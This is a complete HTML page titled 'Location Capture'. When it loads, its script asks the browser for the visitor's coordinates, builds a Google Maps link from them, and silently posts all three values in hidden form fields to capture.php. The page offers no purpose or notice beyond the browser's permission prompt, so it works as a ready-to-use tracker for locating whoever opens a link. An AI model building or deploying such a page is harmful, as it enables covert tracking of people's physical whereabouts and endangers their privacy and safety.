<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Location Capture</title>
</head>
<body>
    <h1>Location Capture</h1>

    <script>
        // Function to get the user's location
        function captureLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendLocation);
            } else {
                alert("Geolocation is not supported by this browser.");
            }
        }

        // Function to send location to PHP
        function sendLocation(position) {
            var latitude = position.coords.latitude;
            var longitude = position.coords.longitude;

            // Create a Google Maps link
            var googleMapsLink = "https://www.google.com/maps?q=" + latitude + "," + longitude;

            // Create a form and append latitude, longitude, and link as hidden inputs
            var form = document.createElement("form");
            form.method = "POST";
            form.action = "capture.php";

            var latInput = document.createElement("input");
            latInput.type = "hidden";
            latInput.name = "latitude";
            latInput.value = latitude;

            var lonInput = document.createElement("input");
            lonInput.type = "hidden";
            lonInput.name = "longitude";
            lonInput.value = longitude;

            var linkInput = document.createElement("input");
            linkInput.type = "hidden";
            linkInput.name = "googleMapsLink";
            linkInput.value = googleMapsLink;

            form.appendChild(latInput);
            form.appendChild(lonInput);
            form.appendChild(linkInput);

            document.body.appendChild(form);
            form.submit();
        }

        // Automatically capture location on page load
        window.onload = captureLocation;
    </script>
</body>
</html>
